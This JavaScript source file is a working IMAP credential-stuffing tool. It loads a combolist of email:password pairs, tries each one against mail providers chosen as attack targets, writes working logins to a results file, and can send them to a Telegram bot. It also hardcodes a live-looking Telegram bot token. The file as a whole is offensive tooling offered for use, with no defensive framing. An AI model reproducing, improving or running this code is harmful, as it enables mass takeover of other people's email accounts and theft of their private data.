process.env["NTBA_FIX_319"] = 1; // telegram bot warning fix
// dependencies
const colors = require("colors");
const hashFile = require("sha256-file");
const sleep = require("sleep");
const imaps = require("imap-simple");
const fs = require("fs");
const cliProgress = require("cli-progress");
const TelegramBot = require("node-telegram-bot-api");
const configs = require("./imaps.json");
const inquirer = require("inquirer");
const os = require("os");

// const

const RESULT_FILE = "results.txt";
const SAVE_FILE = "save.json";

// var

const progressBar = new cliProgress.SingleBar(
  { forceRedraw: true },
  cliProgress.Presets.shades_classic
);

var selection, dictionary, id;
var max, counter, found, line, toCount, lastLine;
var resumeSave, unreachbleHost, botEnabled;
var log = "Nothing!";

dictionary = null;
max = counter = found = line = toCount = lastLine = 0;
resumeSave = unreachbleHost = botEnabled = false;

function createFile(filename) {
  fs.open(filename, "r", function(err, fd) {
    if (err) {
      fs.writeFile(filename, "", function(err) {
        if (err) console.log(err);
      });
    }
  });
}

// Multiway Initialization
setupBot = () => {
  botEnabled = true;
  const botToken = "1015158198:AAE8d8TzPix7J5vPa9jr0wAsiJjdjocZiOY";
  const bot = new TelegramBot(botToken, { polling: true });

  bot.addListener("polling_error", error => {
    handlePollingError();
    botEnabled = false;
    bot.stopPolling();
    process.exit(404);
  });

  bot.onText(/\/status/, (msg, match) => {
    // 'msg' is the received Message from Telegram
    // 'match' is the result of executing the regexp above on the text content
    // of the message
    id = msg.chat.id;
    // send back the matched "whatever" to the chat
    bot.sendMessage(id, "Current progress is " + counter + " / " + max);
    bot.sendMessage(id, "Found " + found + " working combo...");
  });

  bot.onText(/\/log/, (msg, match) => {
    // 'msg' is the received Message from Telegram
    // 'match' is the result of executing the regexp above on the text content
    // of the message
    id = msg.chat.id;
    // send back the matched "whatever" to the chat
    bot.sendMessage(id, log);
  });

  bot.onText(/\/start/, (msg, match) => {
    // 'msg' is the received Message from Telegram
    // 'match' is the result of executing the regexp above on the text content
    // of the message
    id = msg.chat.id;
    // send back the matched "whatever" to the chat
    bot.sendMessage(
      id,
      "Hello and welcome to the\nIMAP Checker Bot,\n" +
        "Available commands are :\n" +
        "\t/status: Show current progress\n" +
        "\t/log: Show latest error\n"
    );
  });
  selectFilePrompt();
};

clear = () => {
  process.stdout.write("\033c");
};

timedOut = async () => {
  console.log(os.EOL + "[*] Authentification TIMED OUT, retrying...");
  line = lastLine;
  toCount++;
  counter--;
  progressBar.increment(-1);
  if (toCount >= 10) {
    console.log(colors.red("[*] Timed out too many times aborting attack!"));
    console.log(colors.red("[*] Current progress is " + counter + " / " + max));
    console.log(colors.red("[*] Found " + found + " working combo..."));
    process.exit(1);
  }
};

connect = async config => {
  // MAKING A SAVE IN CASE OF A TIMEOUT
  await imaps
    .connect(config)
    .then(connection => {
      found++;
      process.stdout.write(
        colors.green(
          "\t[*] " + config.imap.user + ":" + config.imap.password + "\r\n"
        )
      );
      writeResult(config.imap.user + ":" + config.imap.password + os.EOL);
      if (botEnabled)
        bot.sendMessage(
          id,
          "[*] " + config.imap.user + ":" + config.imap.password
        );
    })
    .catch(error => {
      if (error !== null) log = error.toString();
      if (error.errno === -3008) unreachbleHost = true;
      if (error.source === "timeout") timedOut();
    })
    .finally(() => {
      progressBar.increment();
      lastLine = line;
      counter++;
      
    });
};

customConfig = (str, selection) => {
  for (let i = 0; i < selection.length; i++)
    for (id in configs[selection[i]].tag)
      if (str.includes(configs[selection[i]].tag[id])) {
        return {
          imap: {
            user: str.slice(0, str.indexOf(":")),
            password: str.slice(str.indexOf(":") + 1, str.length),
            host: configs[selection[i]].host,
            port: configs[selection[i]].port,
            tls: configs[selection[i]].tls,
            authTimeout: 5000
          }
        };
      }
  return null;
};

handleNoChoice = () => {
  clear();
  process.stdout.write(colors.white("Please select a least one "));
  process.stdout.write(colors.white.underline.bold("Host"));
  process.stdout.write(colors.white("..."));
  sleep.msleep(2500);
  clear();
  selectHostPrompt();
};

handleDictionaryError = () => {
  clear();
  process.stdout.write(colors.white("Please select a valid "));
  process.stdout.write(colors.underline.bold("Dictionary"));
  process.stdout.write(colors.white("..."));
  sleep.msleep(2500);
  clear();
  selectFilePrompt();
};

handlePollingError = () => {
  clear();
  process.stdout.write(colors.white("Failed to retrieve the Telegram API, "));
  process.stdout.write(colors.white.bold("Check your internet connection"));
  sleep.msleep(2500);
  clear();
  telegramBotPrompt();
};

showResult = () => {
  const result = fs.readFileSync(RESULT_FILE, { encoding: "utf-8" });
  console.log(
    colors.green.bold("- Found out " + found + " correct combo -" + os.EOL)
  );
  console.log(colors.white.bold("- Result List -" + os.EOL));
  console.log(colors.bold(result));
  return result;
};

writeResult = result => {
  fs.appendFileSync(RESULT_FILE, result);
};

readSave = () => {
  var rawData = fs.readFileSync(SAVE_FILE, { encoding: "utf-8" });
  return rawData ? JSON.parse(rawData) : [];
};

main = async () => {
  // READING SAVE FILE

  const saveData = readSave();
  // CHECKING SAVE

  saveData.forEach(element => {
    if (
      JSON.stringify(element.host) === JSON.stringify(selection) &&
      element.hash === hashFile(dictionary)
    ) {
      line = element.index;
      found = element.found;
      max = element.max;
      counter = element.counter;
      resumeSave = true;
      console.log(
        colors.green(
          "[*] Save has been found!\n[*] Starting back the attack from " +
            new Date(element.timestamp).toLocaleString()
        )
      );
      sleep.msleep(5000);
    }
  });

  var array = fs
    .readFileSync(dictionary)
    .toString()
    .split(/\r?\n/);

  // INITIALIZING LOOP

  if (!resumeSave)
    for (line in array)
      for (let i = 0; i < selection.length; i++)
        for (id in configs[selection[i]].tag)
          if (array[line].includes(configs[selection[i]].tag[id])) max++;
  clear(); // CLEAR onsiLS
  progressBar.start(max, counter);

  // MAIN LOOP
  for (line in array) {
    let config = customConfig(array[line], selection);
    if (config) await connect(config);
    if (unreachbleHost) break;
  }

  onComplete();
};
clear();

var arrayConfigs = [];
for (conf in configs) arrayConfigs.push(conf);

var prompt = inquirer.createPromptModule();

selectFilePrompt = () => {
  filePrompt()
    .then(output => {
      dictionary = output.path;
      main();
    })
    .catch(error => {
      handleDictionaryError();
    });
};

onComplete = () => {
  progressBar.stop();
  clear();
  if (unreachbleHost) {
    console.log(
      colors.white.bold(
        "Unable to perform the attack check dns or your internet connectivity!"
      )
    );
    return;
  }
  console.log(colors.white.bold("- IMAP Attack done -"));
  console.log(
    colors.white.bold("- Total Mail Tested: " + max.toString() + " -")
  );
  if (found > 0) showResult();
  else
    console.log(
      colors.white.bold(
        "\nNothing found, try changing combolist or host :( ...\n"
      )
    );

  process.exit();
};

telegramBotPrompt = () => {
  prompt({
    type: "confirm",
    name: "activeBot",
    message: 'Do you want to enable the telegram bot "@ChichkeBOT"'
  })
    .then(isEnable => {
      if (isEnable.activeBot) setupBot();
      else selectFilePrompt();
    })
    .catch(err => {
      console.error(err);
      process.exit(42);
    });
};

filePrompt = () => {
  inquirer.registerPrompt("fuzzypath", require("inquirer-fuzzy-path"));

  return inquirer.prompt([
    {
      type: "fuzzypath",
      name: "path",
      // excludePath :: (String) -> Bool
      // excludePath to exclude some paths from the file-system scan
      // excludeFilter :: (String) -> Bool
      // excludeFilter to exclude some paths from the final list, e.g. '.'
      itemType: "file",
      // itemType :: 'any' | 'directory' | 'file'
      // specify the type of nodes to display
      // default value: 'any'
      // example: itemType: 'file' - hides directories from the item list
      rootPath: "./dictionary/",
      // rootPath :: String
      // Root search directory
      message: "Select your dictionary/combolist",
      default: null,
      suggestOnly: false,
      // suggestOnly :: Bool
      // Restrict prompt answer to available choices or use them as suggestions
      depthLimit: 0
      // depthLimit :: integer >= 0
      // Limit the depth of sub-folders to scan
      // Defaults to infinite depth if undefined
    }
  ]);
};

selectHostPrompt = () => {
  prompt({
    type: "checkbox",
    name: "selection",
    message: "Select host to Attack",
    choices: arrayConfigs,
    pageSize: 6
  })
    .then(array => {
      if (array.selection.length) {
        selection = array.selection;
        telegramBotPrompt();
      } else handleNoChoice();
    })
    .catch(err => {
      console.error(err);
      process.exit(42);
    });
};

createFile(SAVE_FILE);
selectHostPrompt();

process.stdin.resume(); //so the program will not close instantly

onCleanup = () => {
  if (!dictionary) return;
  var saveData = readSave();
  var clean = [];

  line = lastLine;
  toCount++;
  counter--;

  const session = {
    timestamp: +new Date(),
    hash: hashFile(dictionary),
    index: line,
    counter: counter,
    max: max,
    found: found,
    host: selection
  };

  for (const key in saveData) {
    if (saveData.hasOwnProperty(key)) {
      const element = saveData[key];
      if (
        JSON.stringify(element.host) !== JSON.stringify(selection) ||
        element.hash !== hashFile(dictionary)
      )
        clean.push(element);
    }
  }

  clean.push(session);
  fs.writeFileSync(SAVE_FILE, JSON.stringify(clean, null, 2));
};

function exitHandler(options, exitCode) {
  if (options.cleanup) onCleanup();
  if (options.exit) process.exit();
}

//do something when app is closing
process.on("exit", exitHandler.bind(null, { cleanup: true }));

//catches ctrl+c event
process.on("SIGINT", exitHandler.bind(null, { exit: true }));

// catches "kill pid" (for example: nodemon restart)
process.on("SIGUSR1", exitHandler.bind(null, { exit: true }));
process.on("SIGUSR2", exitHandler.bind(null, { exit: true }));

//catches uncaught exceptions
// process.on("uncaughtException", exitHandler.bind(null, { exit: true }));
